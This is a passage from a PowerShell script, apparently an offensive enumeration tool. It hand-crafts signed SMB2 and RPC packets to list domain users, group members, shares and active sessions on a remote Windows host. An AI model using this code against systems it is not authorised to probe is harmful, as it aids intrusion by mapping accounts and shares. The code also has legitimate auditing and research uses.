                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $stage = 'SendReceive'
                    }

                    'OpenDomain'
                    {    
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMROpenDomain $SAMR_connect_handle $SID_count $LSA_domain_SID
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x07,0x00,0x00,0x00 0x00,0x00 0x07,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $stage = 'SendReceive'
                    }

                    'OpenGroup'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMROpenGroup $SAMR_domain_handle $SAMR_RID
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x09,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $stage = 'SendReceive'
                    }

                    'ParseLookupRids'
                    {
                        [Byte[]]$response_user_count_bytes = $client_receive[140..143]
                        $response_user_count = [System.BitConverter]::ToInt16($response_user_count_bytes,0)
                        $response_user_start = $response_user_count * 8 + 164
                        $response_user_end = $response_user_start
                        $response_user_length_start = 152
                        $response_user_list = @()
                        $response_username_list = @()
                        $response_user_type_list = @()
                        $i = 0

                        while($i -lt $response_user_count)
                        {
                            [Byte[]]$response_user_length_bytes = $client_receive[$response_user_length_start..($response_user_length_start + 1)]
                            $response_user_length = [System.BitConverter]::ToInt16($response_user_length_bytes,0)
                            $response_user_end = $response_user_start + $response_user_length
                            [Byte[]]$response_actual_count_bytes = $client_receive[($response_user_start - 4)..($response_user_start - 1)]
                            $response_actual_count = [System.BitConverter]::ToInt16($response_actual_count_bytes,0)
                            [Byte[]]$response_user_bytes = $client_receive[$response_user_start..($response_user_end - 1)]
                            
                            if($response_actual_count % 2)
                            {
                                $response_user_start += $response_user_length + 14
                            }
                            else
                            {
                                $response_user_start += $response_user_length + 12
                            }

                            $response_user = [System.BitConverter]::ToString($response_user_bytes)
                            $response_user = $response_user -replace "-00",""
                            $response_user = $response_user.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $response_user = New-Object System.String ($response_user,0,$response_user.Length)
                            $response_username_list += $response_user
                            $response_user_length_start = $response_user_length_start + 8
                            $i++
                        }

                        $response_user_type_array_bytes = $client_receive[($response_user_end + 14)..($response_user_end + 13 + ($response_user_count * 4))]
                        $response_user_type_start = 0

                        for($i = 0; $i -lt $response_user_count; $i++)
                        {  
                            $response_user_type_bytes = $response_user_type_array_bytes[($response_user_type_start..($response_user_type_start + 3))]
                            $response_user_type_start += 4
                            $response_user_type = [System.BitConverter]::ToInt16($response_user_type_bytes,0)

                            if($response_user_type -eq 1)
                            {
                                $response_user_type_list += "user"
                            }
                            else
                            {
                                $response_user_type_list += "group"
                            }
                            
                        }

                        $i = 0

                        ForEach($user in $response_username_list)
                        {
                            $response_user_object = New-Object PSObject
                            Add-Member -InputObject $response_user_object -MemberType NoteProperty -Name Username $user
                            Add-Member -InputObject $response_user_object -MemberType NoteProperty -Name Type $response_user_type_list[$i]
                            $response_user_list += $response_user_object
                            $i++
                        }

                        if($Action -eq 'All' -or $TargetShow)
                        {
                            Write-Output "$Target $Group Users:"
                        }
                        
                        Write-Output $response_user_list | Sort-Object -property Username |Format-Table -AutoSize
                        $stage = 'CloseRequest'
                    }

                    'ParseLookupSids'
                    {
                        [Byte[]]$response_domain_count_bytes = $client_receive[144..147]
                        $response_domain_count = [System.BitConverter]::ToInt16($response_domain_count_bytes,0)
                        $response_domain_start = $response_domain_count * 12 + 172
                        $response_domain_end = $response_domain_start
                        $response_domain_length_start = 160
                        $response_domain_list = @()
                        $i = 0

                        while($i -lt $response_domain_count)
                        {
                            [Byte[]]$response_domain_length_bytes = $client_receive[$response_domain_length_start..($response_domain_length_start + 1)]
                            $response_domain_length = [System.BitConverter]::ToInt16($response_domain_length_bytes,0)
                            $response_domain_end = $response_domain_start + $response_domain_length
                            [Byte[]]$response_actual_count_bytes = $client_receive[($response_domain_start - 4)..($response_domain_start - 1)]
                            $response_actual_count = [System.BitConverter]::ToInt16($response_actual_count_bytes,0)
                            [Byte[]]$response_domain_bytes = $client_receive[$response_domain_start..($response_domain_end - 1)]
                            
                            if($response_actual_count % 2)
                            {
                                $response_domain_start += $response_domain_length + 42
                            }
                            else
                            {
                                $response_domain_start += $response_domain_length + 40
                            }

                            $response_domain = [System.BitConverter]::ToString($response_domain_bytes)
                            $response_domain = $response_domain -replace "-00",""
                            $response_domain = $response_domain.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $response_domain = New-Object System.String ($response_domain,0,$response_domain.Length)
                            $response_domain_list += $response_domain
                            $response_domain_length_start = $response_domain_length_start + 12
                            $i++
                        }

                        [Byte[]]$response_user_count_bytes = $client_receive[($response_domain_start - 4)..($response_domain_start - 1)]         
                        $response_user_count = [System.BitConverter]::ToInt16($response_user_count_bytes,0)
                        $response_user_start = $response_user_count * 16 + $response_domain_start + 12
                        $response_user_end = $response_user_start
                        $response_user_length_start = $response_domain_start + 4
                        $response_user_list = @()
                        $i = 0

                        while($i -lt $response_user_count)
                        {
                            $response_user_object = New-Object PSObject
                            [Byte[]]$response_user_type_bytes = $client_receive[($response_user_length_start - 4)]
                            [Byte[]]$response_user_length_bytes = $client_receive[$response_user_length_start..($response_user_length_start + 1)]
                            $response_user_length = [System.BitConverter]::ToInt16($response_user_length_bytes,0)
                            $response_SID_index_start = $response_user_length_start + 8
                            [Byte[]]$response_SID_index_bytes = $client_receive[$response_SID_index_start..($response_SID_index_start + 3)]
                            $response_SID_index = [System.BitConverter]::ToInt16($response_SID_index_bytes,0)
                            $response_user_end = $response_user_start + $response_user_length
                            [Byte[]]$response_actual_count_bytes = $client_receive[($response_user_start - 4)..($response_user_start - 1)]
                            $response_actual_count = [System.BitConverter]::ToInt16($response_actual_count_bytes,0)
                            [Byte[]]$response_user_bytes = $client_receive[$response_user_start..($response_user_end - 1)]

                            if($response_actual_count % 2)
                            {
                                $response_user_start += $response_user_length + 14
                            }
                            else
                            {
                                $response_user_start += $response_user_length + 12
                            }

                            if($response_user_type_bytes -eq 1)
                            {
                                $response_user_type = "user"
                            }
                            else
                            {
                                $response_user_type = "group"
                            }


                            $response_user = [System.BitConverter]::ToString($response_user_bytes)
                            $response_user = $response_user -replace "-00",""
                            $response_user = $response_user.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $response_user = New-Object System.String ($response_user,0,$response_user.Length)
                            Add-Member -InputObject $response_user_object -MemberType NoteProperty -Name Username $response_user
                            Add-Member -InputObject $response_user_object -MemberType NoteProperty -Name Domain $response_domain_list[$response_SID_index]
                            Add-Member -InputObject $response_user_object -MemberType NoteProperty -Name Type $response_user_type
                            $response_user_length_start = $response_user_length_start + 16
                            $response_user_list += $response_user_object
                            $i++
                        }

                        if($Action -eq 'All' -or $TargetShow)
                        {
                            Write-Output "$Target $Group Group Members:"
                        }
                        
                        Write-Output $response_user_list | Sort-Object -property Username |Format-Table -AutoSize
                        $stage = 'CloseRequest'
                    }

                    'ParseSRVSVC'
                    {
                        $response_object_list = @()
                        $share_list = @()
                        [Byte[]]$response_count_bytes = $client_receive[152..155]
                        $response_count = [System.BitConverter]::ToInt32($response_count_bytes,0)
                        $response_item_index = 164
                        $i = 0

                        while($i -lt $response_count)
                        {

                            if($i -gt 0)
                            {

                                if($response_item_length % 2)
                                {
                                    $response_item_index += $response_item_length * 2 + 2
                                }
                                else
                                {
                                    $response_item_index += $response_item_length * 2
                                }

                            }
                            else
                            {
                                
                                if($action_stage -eq 'Share')
                                {
                                    $response_item_index += $response_count * 12
                                }
                                else
                                {
                                    $response_item_index += $response_count * 16
                                }

                            }

                            $response_item_object = New-Object PSObject
                            [Byte[]]$response_item_length_bytes = $client_receive[$response_item_index..($response_item_index + 3)]
                            $response_item_length = [System.BitConverter]::ToInt32($response_item_length_bytes,0)
                            $response_item_index += 12
                            [Byte[]]$response_item_bytes = $client_receive[($response_item_index)..($response_item_index + ($response_item_length * 2 - 1))]
                            $response_item = [System.BitConverter]::ToString($response_item_bytes)
                            $response_item = $response_item -replace "-00",""
                            $response_item = $response_item.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $response_item = New-Object System.String ($response_item,0,$response_item.Length)
                            
                            if($response_item_length % 2)
                            {
                                $response_item_index += $response_item_length * 2 + 2
                            }
                            else
                            {
                                $response_item_index += $response_item_length * 2
                            }
                            
                            [Byte[]]$response_item_length_bytes = $client_receive[$response_item_index..($response_item_index + 3)]
                            $response_item_length = [System.BitConverter]::ToInt32($response_item_length_bytes,0)
                            $response_item_index += 12
                            [Byte[]]$response_item_2_bytes = $client_receive[($response_item_index)..($response_item_index + ($response_item_length * 2 - 1))]
                            $response_item_2 = [System.BitConverter]::ToString($response_item_2_bytes)
                            $response_item_2 = $response_item_2 -replace "-00",""
                            $response_item_2 = $response_item_2.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $response_item_2 = New-Object System.String ($response_item_2,0,$response_item_2.Length)

                            if($action_stage -eq 'Share')
                            {
                                $share_list += $response_item
                                Add-Member -InputObject $response_item_object -MemberType NoteProperty -Name Share $response_item
                                Add-Member -InputObject $response_item_object -MemberType NoteProperty -Name Description $response_item_2
                                Add-Member -InputObject $response_item_object -MemberType NoteProperty -Name "Access Mask" ""
                            }
                            else
                            {
                                Add-Member -InputObject $response_item_object -MemberType NoteProperty -Name Username $response_item_2
                                Add-Member -InputObject $response_item_object -MemberType NoteProperty -Name Source $response_item
                            }

                            $response_object_list += $response_item_object
                            $i++
                        }

                        if($Action -eq 'All' -and $action_stage -eq 'Share')
                        {
                            Write-Output "$Target Shares:"
                        }
                        elseif($Action -eq 'All' -and $action_stage -eq 'NetSession' -or $TargetShow)
                        {
                            Write-Output "$Target NetSessions:"
                        }

                        if($action_stage -eq 'NetSession')
                        {
                            Write-Output $response_object_list | Sort-Object -property Share |Format-Table -AutoSize
                        }

                        $stage = 'CloseRequest'
                    }

                    'ParseUsers'
                    {
                        [Byte[]]$response_user_count_bytes = $client_receive[148..151]
                        $response_user_count = [System.BitConverter]::ToInt16($response_user_count_bytes,0)
                        $response_user_start = $response_user_count * 12 + 172
                        $response_user_end = $response_user_start
                        $response_RID_start = 160
                        $response_user_length_start = 164
                        $response_user_list = @()
                        $i = 0

                        while($i -lt $response_user_count)
                        {
                            $response_user_object = New-Object PSObject
                            [Byte[]]$response_user_length_bytes = $client_receive[$response_user_length_start..($response_user_length_start + 1)]
                            $response_user_length = [System.BitConverter]::ToInt16($response_user_length_bytes,0)
                            [Byte[]]$response_RID_bytes = $client_receive[$response_RID_start..($response_RID_start + 3)]
                            $response_RID = [System.BitConverter]::ToInt16($response_RID_bytes,0)
                            $response_user_end = $response_user_start + $response_user_length
                            [Byte[]]$response_actual_count_bytes = $client_receive[($response_user_start - 4)..($response_user_start - 1)]
                            $response_actual_count = [System.BitConverter]::ToInt16($response_actual_count_bytes,0)
                            [Byte[]]$response_user_bytes = $client_receive[$response_user_start..($response_user_end - 1)]
                            
                            if($response_actual_count % 2)
                            {
                                $response_user_start += $response_user_length + 14
                            }
                            else
                            {
                                $response_user_start += $response_user_length + 12
                            }

                            $response_user = [System.BitConverter]::ToString($response_user_bytes)
                            $response_user = $response_user -replace "-00",""
                            $response_user = $response_user.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $response_user = New-Object System.String ($response_user,0,$response_user.Length)
                            Add-Member -InputObject $response_user_object -MemberType NoteProperty -Name Username $response_user
                            Add-Member -InputObject $response_user_object -MemberType NoteProperty -Name RID $response_RID
                            $response_user_length_start = $response_user_length_start + 12
                            $response_RID_start = $response_RID_start + 12
                            $response_user_list += $response_user_object
                            $i++
                        }

                        if($Action -eq 'All' -or $TargetShow)
                        {
                            Write-Output "$Target Users:"
                        }

                        Write-Output $response_user_list | Sort-Object -property Username |Format-Table -AutoSize
                        $stage = 'CloseRequest'
                    }
                
                    'QueryGroupMember'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMRQueryGroupMember $group_handle
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x10,0x00,0x00,0x00 0x00,0x00 0x19,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $stage = 'SendReceive'
                    }

                    'QueryInfoRequest'
                    {          
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x10,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2QueryInfoRequest 0x01 0x05 0x18,0x00,0x00,0x00 0x68,0x00 $file_ID
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data 
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $stage = 'SendReceive'
                    }
                
                    'ReadRequest'
                    {
                        Start-Sleep -m $Sleep
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2ReadRequest $file_ID
                        $packet_SMB_data["Length"] = 0x00,0x04,0x00,0x00
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data 
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data 
                        $stage = 'SendReceive'
                    }

                    'RPCBind'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_RPC_data = New-PacketRPCBind $frag_length $call_ID $num_ctx_items 0x00,0x00 $named_pipe_UUID $named_pipe_UUID_version
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $stage = 'SendReceive'
                    }

                    'SAMRCloseRequest'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMRClose $SAMR_domain_handle
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x09,0x00,0x00,0x00 0x00,0x00 0x01,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $stage = 'SendReceive'
                    }

                    'SendReceive'
                    {
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }

                    }
            
                    'StatusPending'
                    {
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if([System.BitConverter]::ToString($client_receive[12..15]) -ne '03-01-00-00')
                        {
                            $stage = 'StatusReceived'
                        }

                    }

                    'StatusReceived'
                    {
                        
                        switch ($stage_current)
                        {

                            'CloseRequest'
                            {

                                if($step -eq 1)
                                {
                                    $named_pipe = 0x73,0x00,0x61,0x00,0x6d,0x00,0x72,0x00 # samr
                                    $stage = 'CreateRequest'
                                }
                                elseif($action_stage -eq 'Share' -and $share_list.Count -gt 0)
                                {
                                    $stage = 'TreeConnect'
                                }
                                else
                                {
                                    $stage = 'TreeDisconnect'
                                }

                            }

                            'Connect2'
                            {
                                $step++
                                
                                if($client_receive[119] -eq 3 -and [System.BitConverter]::ToString($client_receive[140..143]) -eq '05-00-00-00')
                                {
                                    
                                    if($Action -eq 'All')
                                    {
                                        Write-Output "[-] $username does not have permission to enumerate groups, users, and NetSessions on $target"
                                    }
                                    else
                                    {
                                        Write-Output "[-] $username does not have permission to enumerate groups on $target"
                                    }
                                    
                                    $RPC_access_denied = $true 
                                    $stage = 'CloseRequest'
                                }
                                else
                                {
                                    $SID_count = 0x04,0x00,0x00,0x00
                                    [Byte[]]$SAMR_connect_handle = $client_receive[140..159]
                                    $stage = 'OpenDomain'
                                }

                            }

                            'Connect5'
                            {
                                $step++

                                if($client_receive[119] -eq 3 -and [System.BitConverter]::ToString($client_receive[140..143]) -eq '05-00-00-00')
                                {
                                    Write-Output "[-] $username does not have permission to enumerate users on $target"
                                    $stage = 'CloseRequest'
                                }
                                else
                                {
                                    $SID_count = 0x04,0x00,0x00,0x00
                                    [Byte[]]$SAMR_connect_handle = $client_receive[156..175]
                                    $stage = 'OpenDomain'
                                }

                            }

                            'CreateRequest'
                            {
                                
                                if($action_stage -eq 'Share')
                                {
                                    $frag_length = 0x48,0x00
                                    $call_ID = 2
                                    $num_ctx_items = 0x01
                                    $named_pipe_UUID = 0xc8,0x4f,0x32,0x4b,0x70,0x16,0xd3,0x01,0x12,0x78,0x5a,0x47,0xbf,0x6e,0xe1,0x88
                                    $named_pipe_UUID_version = 0x03,0x00
                                    $stage_next = 'NetShareEnumAll'
                                }
                                elseif($action_stage -eq 'NetSession')
                                {
                                    $frag_length = 0x74,0x00
                                    $call_ID = 2
                                    $num_ctx_items = 0x02
                                    $named_pipe_UUID = 0xc8,0x4f,0x32,0x4b,0x70,0x16,0xd3,0x01,0x12,0x78,0x5a,0x47,0xbf,0x6e,0xe1,0x88
                                    $named_pipe_UUID_version = 0x03,0x00
                                    $stage_next = 'NetSessEnum'
                                }
                                elseif($step -eq 1)
                                {
                                    $frag_length = 0x48,0x00
                                    $call_ID = 5
                                    $num_ctx_items = 0x01
                                    $named_pipe_UUID = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xac
                                    $named_pipe_UUID_version = 0x01,0x00

                                    if($action_stage -eq 'User')
                                    {
                                        $stage_next = 'Connect5'
                                    }
                                    else
                                    {
                                        $stage_next = 'Connect2'
                                    }

                                }
                                elseif($step -gt 2)
                                {
                                    $frag_length = 0x48,0x00
                                    $call_ID = 14
                                    $num_ctx_items = 0x01
                                    $named_pipe_UUID = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xab
                                    $named_pipe_UUID_version = 0x00,0x00
                                    $named_pipe = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0x76,0x00,0x63,0x00
                                    $stage_next = 'LSAOpenPolicy'
                                }
                                else
                                {
                                    $frag_length = 0x48,0x00
                                    $call_ID = 1
                                    $num_ctx_items = 0x01
                                    $named_pipe_UUID = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xab
                                    $named_pipe_UUID_version = 0x00,0x00
                                    $named_pipe = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0x76,0x00,0x63,0x00
                                    $stage_next = 'LSAOpenPolicy'
                                }

                                $file_ID = $client_receive[132..147]
                        
                                if($Refresh -and $stage -ne 'Exit')
                                {
                                    Write-Output "[+] Session refreshed"
                                    $stage = 'Exit'
                                }
                                elseif($step -ge 2)
                                {
                                    $stage = 'RPCBind'
                                }
                                elseif($stage -ne 'Exit')
                                {
                                    $stage = 'QueryInfoRequest'
                                }

                            }

                            'EnumDomainUsers'
                            {
                                $step++
                                $stage = 'ParseUsers'
                            }

                            'GetMembersInAlias'
                            {
                                $step++
                                [Byte[]]$SID_array = $client_receive[140..([System.BitConverter]::ToInt16($client_receive[3..1],0) - 1)]
                        
                                if([System.BitConverter]::ToString($client_receive[156..159]) -eq '73-00-00-c0')
                                {
                                    $stage = 'SAMRCloseRequest'
                                }
                                else
                                {
                                    $named_pipe = 0x6c,0x00,0x73,0x00,0x61,0x00,0x72,0x00,0x70,0x00,0x63,0x00 # lsarpc
                                    $stage = 'CreateRequest'
                                }

                            }

                            'Logoff'
                            {
                                $stage = 'Exit'
                            }

                            'LookupNames'
                            {
                                $step++
                                [Byte[]]$SAMR_RID = $client_receive[152..155]
                                
                                if([System.BitConverter]::ToString($client_receive[156..159]) -eq '73-00-00-c0')
                                {
                                    $stage = 'SAMRCloseRequest'
                                }
                                else
                                {
                                    
                                    if($step -eq 4)
                                    {
                                        $stage = 'OpenGroup'
                                    }
                                    else
                                    {
                                        $stage = 'OpenAlias'
                                    }

                                }

                            }

                            'LookupRids'
                            {
                                $step++
                                $stage = 'ParseLookupRids'
                            }

                            'LSAClose'
                            {
                                $stage = 'CloseRequest'
                            }

                            'LSALookupSids'
                            {
                                $stage = 'ParseLookupSids'
                            }

                            'LSAOpenPolicy'
                            {
                                [Byte[]]$policy_handle = $client_receive[140..159]

                                if($step -gt 2)
                                {
                                    $stage = 'LSALookupSids'
                                }
                                else
                                {
                                    $stage = 'LSAQueryInfoPolicy'    
                                }

                            }

                            'LSAQueryInfoPolicy'
                            {
                                [Byte[]]$LSA_domain_length_bytes = $client_receive[148..149]
                                $LSA_domain_length = [System.BitConverter]::ToInt16($LSA_domain_length_bytes,0)
                                [Byte[]]$LSA_domain_actual_count_bytes = $client_receive[168..171]
                                $LSA_domain_actual_count = [System.BitConverter]::ToInt32($LSA_domain_actual_count_bytes,0)
                                
                                if($LSA_domain_actual_count % 2)
                                {
                                    $LSA_domain_length += 2
                                }

                                [Byte[]]$LSA_domain_SID = $client_receive[(176 + $LSA_domain_length)..(199 + $LSA_domain_length)]
                                $stage = 'LSAClose'
                            }

                            'NetSessEnum'
                            {
                                
                                if([System.BitConverter]::ToString($client_receive[172..175]) -eq '05-00-00-00')
                                {
                                    Write-Output "[-] $username does not have permission to enumerate NetSessions on $target"
                                    $stage = 'CloseRequest'
                                }
